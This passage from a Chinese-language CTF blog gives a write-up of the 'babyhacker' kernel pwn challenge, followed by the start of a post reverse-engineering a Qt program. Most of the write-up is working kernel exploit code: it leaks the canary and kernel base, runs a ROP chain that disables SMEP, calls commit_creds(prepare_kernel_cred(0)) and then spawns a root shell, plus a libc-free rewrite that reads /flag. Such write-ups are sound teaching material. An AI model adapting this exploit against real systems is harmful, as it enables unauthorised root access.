class="params">()</span></span>&#123;</span><br><span class="line">    fd = <span class="built_in">open</span>(<span class="string">&quot;/dev/babyhacker&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">perror</span>(<span class="string">&quot;open module failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setsize</span><span class="params">(<span class="type">int</span> size)</span></span>&#123;</span><br><span class="line">    <span class="built_in">ioctl</span>(fd,<span class="number">0x30000</span>,size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">copyfrom</span><span class="params">(<span class="type">char</span> *buf)</span></span>&#123;</span><br><span class="line">    <span class="built_in">ioctl</span>(fd,<span class="number">0x30001</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">copyto</span><span class="params">(<span class="type">char</span> *buf)</span></span>&#123;</span><br><span class="line">    <span class="built_in">ioctl</span>(fd,<span class="number">0x30002</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">getroot</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">void</span> *(*pkc)(<span class="type">int</span>) = (<span class="type">void</span> *(*)(<span class="type">int</span>))PREPARE_KERNEL_CRED;</span><br><span class="line">    <span class="built_in">void</span> (*cc)(<span class="type">void</span> *) = (<span class="built_in">void</span> (*)(<span class="type">void</span> *))COMMIT_CREDS;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">savestate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov %cs,user_cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov %ss,user_ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov %rsp,user_sp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_flags;&quot;</span></span><br><span class="line">           );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;user state saved!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">getshell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;/bin/sh\x00&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x200</span>];</span><br><span class="line">    <span class="type">uint64_t</span> kernel;</span><br><span class="line">    <span class="type">uint64_t</span> canary;</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">savestate</span>();</span><br><span class="line">    <span class="built_in">initfd</span>();</span><br><span class="line">    <span class="built_in">setsize</span>(<span class="number">0xffff0200</span>);</span><br><span class="line">    <span class="comment">// leaking kernel and canary</span></span><br><span class="line">    <span class="built_in">copyto</span>(buf);</span><br><span class="line">    <span class="type">uint64_t</span> *d = (<span class="type">uint64_t</span> *)buf;</span><br><span class="line">    kernel = d[<span class="number">17</span>];</span><br><span class="line">    canary = d[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel : 0x%lx\n&quot;</span>,kernel);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;canary : 0x%lx\n&quot;</span>,canary);</span><br><span class="line">    prepare_kernel_cred = kernel<span class="number">-0x1747c5</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred : 0x%lx\n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">    commit_creds = kernel<span class="number">-0x174bb5</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;commit_creds : 0x%lx\n&quot;</span>,commit_creds);</span><br><span class="line">    <span class="comment">// krop</span></span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">0x200</span>);</span><br><span class="line">    <span class="type">uint64_t</span> *r = (<span class="type">uint64_t</span> *)buf;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0x28</span>;</span><br><span class="line">    r[i++] = canary;</span><br><span class="line">    r[i++] = <span class="number">0</span>;</span><br><span class="line">    r[i++] = kernel<span class="number">-0x185a98</span>; <span class="comment">// mov rdi;ret</span></span><br><span class="line">    r[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">    r[i++] = kernel<span class="number">-0x211275</span>; <span class="comment">//mov cr4,rdi; pop rbp; ret</span></span><br><span class="line">    r[i++] = <span class="number">0</span>;</span><br><span class="line">    r[i++] = (<span class="type">uint64_t</span>)getroot;</span><br><span class="line">    r[i++] = kernel<span class="number">-0x1b2931</span>; <span class="comment">//swapgs; pop rbp; ret</span></span><br><span class="line">    r[i++] = <span class="number">0</span>;</span><br><span class="line">    r[i++] = kernel<span class="number">+0x475293</span>; <span class="comment">//iretq</span></span><br><span class="line">    r[i++] = (<span class="type">uint64_t</span>)getshell;</span><br><span class="line">    r[i++] = user_cs;</span><br><span class="line">    r[i++] = user_flags;</span><br><span class="line">    r[i++] = user_sp;</span><br><span class="line">    r[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//hexdump(buf,0x200);</span></span><br><span class="line">    <span class="built_in">copyfrom</span>((<span class="type">char</span> *)r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="others"><a href="#others" class="headerlink" title="others"></a>others</h2><p>  However,<code>start_vm.sh</code>脚本中服务器时间设置太短15s,导致没有足够时间上传exp… </br><br>  PS.我也不知道Why?可能是网速太慢了叭…</p>
<p>  通过WP发现可能是静态编译后的binary比较大?wow,有858k</p>
  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/C/2/x/babyhacker-pwn &gt;&gt; <span class="built_in">ls</span> -lah exp</span><br><span class="line">-rwxr-xr-x 1 <span class="built_in">tac</span> <span class="built_in">tac</span> 858K 3月  17 20:40 exp</span><br></pre></td></tr></table></figure>

<p>  剩下的问题就是如何缩小exp的大小<br>  exp大主要因为将静态编译将libc全部编译到了binary中，于是可以脱离libc重写exp:</p>
<ul>
<li>编译使用<code>gcc --nostdlib</code>即可不使用glibc</li>
<li>去除所有头文件,尽量不使用头文件相关constant,define,marco…</li>
<li>将cpp用到的所有syscall库函数全部内联汇编简单实现一遍</li>
<li>printf此类复杂库函数不使用,使用原生库函数，例如<code>read</code>,<code>write</code>…</li>
<li><code>main</code>函数改成<code>_start</code>函数</li>
</ul>
<p>  最后经过很麻烦得调试,tinyexp.c出炉:</p>
  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @Date:   2020-03-17 23:49:54</span></span><br><span class="line"><span class="comment">* @Last Modified time: 2020-03-18 18:18:21</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//gcc -static -nostdlib babyhacker_tiny.c -o tinyexp</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">uint64_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">uint64_t</span> user_cs,user_ss,user_flags,user_sp;</span><br><span class="line"><span class="type">uint64_t</span> prepare_kernel_cred;</span><br><span class="line"><span class="type">uint64_t</span> commit_creds;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">getuid</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line">__asm__ __volatile__</span><br><span class="line">  (<span class="string">&quot;mov $0x66,%%eax\n&quot;</span></span><br><span class="line">    <span class="string">&quot;syscall\n&quot;</span></span><br><span class="line">    <span class="string">&quot;mov %%eax,%0\n&quot;</span> <span class="comment">//返回值在eax中即</span></span><br><span class="line">    :<span class="string">&quot;=m&quot;</span>(ret):</span><br><span class="line">  );</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">read</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buf,<span class="type">int</span> len)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> ret=<span class="number">0</span>;</span><br><span class="line">  __asm__(<span class="string">&quot;mov %1,%%rdi;&quot;</span></span><br><span class="line">      <span class="string">&quot;mov %2,%%rsi;&quot;</span></span><br><span class="line">      <span class="string">&quot;mov %3,%%rdx;&quot;</span></span><br><span class="line">      <span class="string">&quot;mov $0,%%rax;&quot;</span></span><br><span class="line">      <span class="string">&quot;syscall;&quot;</span></span><br><span class="line">      <span class="string">&quot;mov %%rax,%0;&quot;</span></span><br><span class="line">      :<span class="string">&quot;=m&quot;</span>(ret)</span><br><span class="line">      :<span class="string">&quot;m&quot;</span>(fd),<span class="string">&quot;m&quot;</span>(buf),<span class="string">&quot;m&quot;</span>(len)</span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">read</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buf,<span class="type">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> ret=<span class="number">0</span>;</span><br><span class="line">    __asm__(<span class="string">&quot;mov %1,%%rdi;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov %2,%%rsi;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov %3,%%rdx;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov $0,%%rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov %%rax,%0;&quot;</span></span><br><span class="line">        :<span class="string">&quot;=m&quot;</span>(ret)</span><br><span class="line">        :<span class="string">&quot;m&quot;</span>(fd),<span class="string">&quot;m&quot;</span>(buf),<span class="string">&quot;m&quot;</span>(len)</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">open</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">uint64_t</span> flags,<span class="type">uint64_t</span> mode)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> ret=<span class="number">0</span>;</span><br><span class="line">    __asm__ __volatile__</span><br><span class="line">    (</span><br><span class="line">        <span class="string">&quot;mov %1,%%rdi\n&quot;</span> <span class="comment">//传递第一个参数</span></span><br><span class="line">        <span class="string">&quot;mov %2,%%rsi\n&quot;</span> <span class="comment">//传递第二个参数</span></span><br><span class="line">        <span class="string">&quot;mov %3,%%rdx\n&quot;</span> <span class="comment">//传递第二个参数</span></span><br><span class="line">        <span class="string">&quot;mov $2,%%rax\n&quot;</span> <span class="comment">//__NR_open在64位系统调用号为2</span></span><br><span class="line">        <span class="string">&quot;syscall\n&quot;</span> <span class="comment">//相当于int 0x80但在64位上使用syscall指令</span></span><br><span class="line">        <span class="string">&quot;mov %%eax,%0\n&quot;</span> <span class="comment">//返回值在eax中即fd</span></span><br><span class="line">        :<span class="string">&quot;=m&quot;</span>(ret)</span><br><span class="line">        :<span class="string">&quot;m&quot;</span>(pathname),<span class="string">&quot;m&quot;</span>(flags),<span class="string">&quot;m&quot;</span>(mode)</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">system</span><span class="params">(<span class="type">char</span> *cmd)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    __asm__(<span class="string">&quot;mov %1,%%rdi;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov $0,%%rsi;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov $0,%%rdx;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov $59,%%rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov %%rax,%0;&quot;</span></span><br><span class="line">        :<span class="string">&quot;=m&quot;</span>(ret)</span><br><span class="line">        :<span class="string">&quot;m&quot;</span>(cmd)</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">ioctl</span><span class="params">(<span class="type">uint64_t</span> fd,<span class="type">uint64_t</span> cmd,<span class="type">void</span> *data)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov %1,%%rdi\n&quot;</span> <span class="comment">//传递第一个参数</span></span><br><span class="line">        <span class="string">&quot;mov %2,%%rsi\n&quot;</span> <span class="comment">//传递第二个参数</span></span><br><span class="line">        <span class="string">&quot;mov %3,%%rdx\n&quot;</span> <span class="comment">//传递第三个参数</span></span><br><span class="line">        <span class="string">&quot;mov $16,%%rax\n&quot;</span> <span class="comment">//ioctl在64位系统调用号为16</span></span><br><span class="line">        <span class="string">&quot;syscall\n&quot;</span> <span class="comment">//相当于int 0x80但在64位上使用syscall指令</span></span><br><span class="line">        <span class="string">&quot;mov %%eax,%0\n&quot;</span> <span class="comment">//返回值在eax中</span></span><br><span class="line">        :<span class="string">&quot;=m&quot;</span>(ret): <span class="string">&quot;m&quot;</span>(fd),<span class="string">&quot;m&quot;</span>(cmd),<span class="string">&quot;m&quot;</span>(data)</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">exit</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;xor %rdi,%rdi;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov $60,%rax;&quot;</span></span><br><span class="line">            <span class="string">&quot;syscall;&quot;</span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">initfd</span><span class="params">()</span></span>&#123;</span><br><span class="line">    fd = <span class="built_in">open</span>(<span class="string">&quot;/dev/babyhacker&quot;</span>,<span class="number">0</span>,<span class="number">644</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">write</span><span class="params">(<span class="type">int</span> fd,<span class="type">char</span> *buf,<span class="type">int</span> len)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> ret=<span class="number">0</span>;</span><br><span class="line">  __asm__ __volatile__</span><br><span class="line">  (</span><br><span class="line">      <span class="string">&quot;mov %1,%%rdi\n&quot;</span> <span class="comment">//传递第一个参数</span></span><br><span class="line">      <span class="string">&quot;mov %2,%%rsi\n&quot;</span> <span class="comment">//传递第二个参数</span></span><br><span class="line">      <span class="string">&quot;mov %3,%%rdx\n&quot;</span> <span class="comment">//传递第三个参数</span></span><br><span class="line">      <span class="string">&quot;mov $1,%%eax\n&quot;</span> <span class="comment">//write在64位系统调用号为1</span></span><br><span class="line">      <span class="string">&quot;syscall\n&quot;</span> <span class="comment">//相当于int 0x80但在64位上使用syscall指令</span></span><br><span class="line">      <span class="string">&quot;mov %%eax,%0\n&quot;</span> <span class="comment">//返回值在eax中即fd</span></span><br><span class="line">      :<span class="string">&quot;=m&quot;</span>(ret): <span class="string">&quot;m&quot;</span>(fd),<span class="string">&quot;m&quot;</span>(buf),<span class="string">&quot;m&quot;</span>(len)</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">setsize</span><span class="params">(<span class="type">int</span> size)</span></span>&#123;</span><br><span class="line">    <span class="built_in">ioctl</span>(fd,<span class="number">0x30000</span>,size);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">copyfrom</span><span class="params">(<span class="type">char</span> *buf)</span></span>&#123;</span><br><span class="line">    <span class="built_in">ioctl</span>(fd,<span class="number">0x30001</span>,buf);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">copyto</span><span class="params">(<span class="type">char</span> *buf)</span></span>&#123;</span><br><span class="line">    <span class="built_in">ioctl</span>(fd,<span class="number">0x30002</span>,buf);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">savestate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov %cs,user_cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov %ss,user_ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov %rsp,user_sp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_flags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> buf0[<span class="number">0x50</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">getshell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getuid</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// system(&#x27;/bin/sh\x00&#x27;);</span></span><br><span class="line">    <span class="type">int</span> f = <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">read</span>(f,buf0,<span class="number">0x50</span>);</span><br><span class="line">    <span class="built_in">write</span>(<span class="number">0</span>,buf0,<span class="number">0x50</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> <span class="built_in">getroot</span>() &#123;</span><br><span class="line">    <span class="type">void</span> *(*pkc)(<span class="type">int</span>) = (<span class="type">void</span> *(*)(<span class="type">int</span>))prepare_kernel_cred;</span><br><span class="line">    <span class="built_in">void</span> (*cc)(<span class="type">void</span> *) = (<span class="built_in">void</span> (*)(<span class="type">void</span> *))commit_creds;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _start()&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x200</span>] = <span class="string">&quot;\0&quot;</span>;</span><br><span class="line">    <span class="type">uint64_t</span> kernel;</span><br><span class="line">    <span class="type">uint64_t</span> canary;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">savestate</span>();</span><br><span class="line">    <span class="built_in">initfd</span>();</span><br><span class="line">    <span class="built_in">setsize</span>(<span class="number">0xffff0200</span>);</span><br><span class="line">    <span class="built_in">copyto</span>(buf);</span><br><span class="line">    <span class="type">uint64_t</span> *d = (<span class="type">uint64_t</span> *)buf;</span><br><span class="line">    kernel = d[<span class="number">17</span>];</span><br><span class="line">    canary = d[<span class="number">10</span>];</span><br><span class="line">    prepare_kernel_cred = kernel<span class="number">-0x1747c5</span>;</span><br><span class="line">    commit_creds = kernel<span class="number">-0x174bb5</span>;</span><br><span class="line">    <span class="type">uint64_t</span> *r = (<span class="type">uint64_t</span> *)buf;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0x28</span>;</span><br><span class="line">    r[i++] = canary;</span><br><span class="line">    r[i++] = <span class="number">0</span>;</span><br><span class="line">    r[i++] = kernel<span class="number">-0x185a98</span>; <span class="comment">// mov rdi;ret</span></span><br><span class="line">    r[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">    r[i++] = kernel<span class="number">-0x211275</span>; <span class="comment">//mov cr4,rdi; pop rbp; ret</span></span><br><span class="line">    r[i++] = <span class="number">0</span>;</span><br><span class="line">    r[i++] = (<span class="type">uint64_t</span>)getroot;</span><br><span class="line">    r[i++] = kernel<span class="number">-0x1b2931</span>; <span class="comment">//swapgs; pop rbp; ret</span></span><br><span class="line">    r[i++] = <span class="number">0</span>;</span><br><span class="line">    r[i++] = kernel<span class="number">+0x475293</span>; <span class="comment">//iretq</span></span><br><span class="line">    r[i++] = (<span class="type">uint64_t</span>)getshell;</span><br><span class="line">    r[i++] = user_cs;</span><br><span class="line">    r[i++] = user_flags;</span><br><span class="line">    r[i++] = user_sp;</span><br><span class="line">    r[i++] = user_ss;</span><br><span class="line">    <span class="built_in">copyfrom</span>((<span class="type">char</span> *)r);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<pre><code>getshell会失败，原因不明，于是改成了`getuid`为root后orw flag. exp中由于自己内联写的syscall,需要处理好环境的一些问题,比如栈balabala.. `gcc -static -nostdlib babyhacker_tiny.c -o tinyexp`生成的tinyexp大小缩小为11KB(858K),缩小 近80倍...

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/C/2/x/babyhacker-pwn &gt;&gt; ls -lah tinyexp                                                                   ✘ 2</span><br><span class="line">-rwxr-xr-x 1 tac tac 11K 3月  18 18:17 tinyexp</span><br></pre></td></tr></table></figure>

over.

还是用musl-gcc比较方便，生成的exp会比较小巧
</code></pre>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/03/02/2020%E6%96%B0%E6%98%A5%E6%8A%97%E7%96%ABctfbabyhacker/" data-id="cuid-YY2zP1yurm-siGECQdCu" data-title="2020-新春抗疫" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-2020qyctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/02/22/2020qyctf/" class="article-date">
  <time class="dt-published" datetime="2020-02-22T03:07:10.000Z" itemprop="datePublished">2020-02-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/02/22/2020qyctf/">gyctf2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="吃鸡神器"><a href="#吃鸡神器" class="headerlink" title="吃鸡神器"></a>吃鸡神器</h2><p>QT程序,详细分析了一下,通过字符串引用找到了failed_dialog slot函数:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_401E00</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">signed</span> __int32 *v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">signed</span> __int32 v3; <span class="comment">// et0</span></span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">signed</span> __int32 *v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">signed</span> __int32 v5; <span class="comment">// et0</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp-8h] [ebp-50h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp-4h] [ebp-4Ch]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+1Ch] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">signed</span> __int32 *v10[<span class="number">7</span>]; <span class="comment">// [esp+2Ch] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  v9 = *(_DWORD *)(*(_DWORD *)(a1 + <span class="number">24</span>) + <span class="number">4</span>);</span><br><span class="line">  <span 